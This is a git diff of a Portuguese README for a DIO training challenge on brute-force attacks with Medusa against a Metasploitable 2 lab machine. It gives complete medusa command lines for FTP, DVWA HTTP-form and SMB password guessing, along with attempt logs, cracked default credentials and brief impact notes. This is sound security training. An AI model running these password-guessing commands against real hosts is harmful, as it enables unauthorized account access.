@@ -1,4 +1,4 @@
-# Desafio Dio 
+# Desafio DIO – Ataques de Força Bruta com Medusa
 
 ## Serviços Identificados no Metasploitable 2
   - FTP (porta 21)
@@ -6,320 +6,53 @@
   - HTTP - DVWA (porta 80)
   - SMB (portas 139/445)
 
+## 1. Ataque ao Serviço FTP
+
 ### Comando:
 medusa -h 192.168.56.101 -u msfadmin -P wordlist_ftp.txt -M ftp -t 4
 
 ### Resultado:
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: root (1 of 10 complete)
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: user (2 of 10 complete)
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: admin (3 of 10 complete)
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: test (4 of 10 complete)
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: password (5 of 10 complete)
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: admin123 (6 of 10 complete)
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 0 complete) Password: 123456 (7 of 10 complete)
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 1 complete) Password: ftp (8 of 10 complete)
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 1 complete) Password: msfadmin (9 of 10 complete)
+
 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
-ACCOUNT CHECK: [ftp] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (1 of 1, 2 complete) Password: EOF (10 of 10 complete)
 
 Credenciais encontradas: msfadmin:msfadmin
+Vulnerabilidade: Uso de credenciais padrão
+Impacto: Permite acesso ao sistema via FTP com privilégios do usuário msfadmin
+
+## Ataque ao Serviço HTTP (DVWA)
 
 ### Comando:
 medusa -h 192.168.56.101 -u admin -P wordlist_dvwa.txt -M http -m FORM:dvwa_login -m DIR:/dvwa/login.php -m DENY-SIGNAL:"Login failed" -t 3
 
 ### Resultado:
-ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: password (1 of 5 complete)
 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: password [SUCCESS]
-ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 1, 1 complete) Password: admin (2 of 5 complete)
 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: admin [SUCCESS]
-ACCOUNT CHECK: [http] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (1 of 1, 2 complete) Password: admin123 (3 of 5 complete)
 ACCOUNT FOUND: [http] Host: 192.168.56.101 User: admin Password: admin123 [SUCCESS]
 
 Credenciais encontradas: admin:password
-Vulnerabilidade: Senha padrão não alterada
-Impacto: Acesso completo ao painel administrativo
+Vulnerabilidade: Senha padrão não alterada e fracas
+Impacto: Acesso total ao painel da DVWA, comprometendo o ambiente web
+
+## Ataque ao Serviço SMB
 
 ### Comando:
 medusa -h 192.168.56.101 -U users.txt -P wordlist_smb.txt -M smbnt -t 2
 
 ### Resultado:
-CCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 0 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: root (1 of 15, 1 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (2 of 15, 1 complete) Password: msfadmin (1 of 18 complete)
 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 2 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (3 of 15, 2 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (4 of 15, 3 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 4 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: www (6 of 15, 4 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: test (5 of 15, 5 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 6 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: guest (8 of 15, 6 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: ftp (7 of 15, 7 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: blank (4 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: qwerty (5 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: admin (6 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: root (7 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: toor (8 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: 1234 (9 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: 12345 (10 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: 123456789 (11 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: letmein (12 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: master (13 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: sunshine (14 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: jesus (15 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: password1 (16 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 8 complete) Password: admin123 (17 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: postgres (9 of 15, 8 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 9 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (10 of 15, 9 complete) Password: EOF (18 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: password (2 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: msfadmin (1 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: backup (11 of 15, 10 complete) Password: 123456 (3 of 18 complete)
-ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: mysql (12 of 15, 10 complete) Password: password (2 of 18 complete)
